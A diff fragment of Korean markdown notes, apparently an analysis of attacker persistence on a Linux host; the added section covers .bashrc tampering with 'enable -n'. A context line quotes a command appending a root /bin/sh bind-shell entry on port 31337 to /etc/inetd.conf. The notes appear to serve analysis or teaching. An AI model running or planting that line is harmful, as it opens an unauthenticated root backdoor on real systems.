@@ -218,3 +218,15 @@ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
 echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
 ```
 - 31337번 포트로 바인드 셸 연결
+
+---
+<details>
+  <summary><strong>.bashrc</strong></summary>
+
+<img width="1104" height="48" alt="image" src="https://github.com/user-attachments/assets/aaf938c7-d5f8-4d6c-8a25-a9d27019894c" />
+
+- `enable -n` : `bash`에서 내장 명령어 비활성화.
+- 위의 스크립트에서 `#`에 대해서 제대로 처리가 안되어서 이후는 주석처리.
+
+  
+</details>
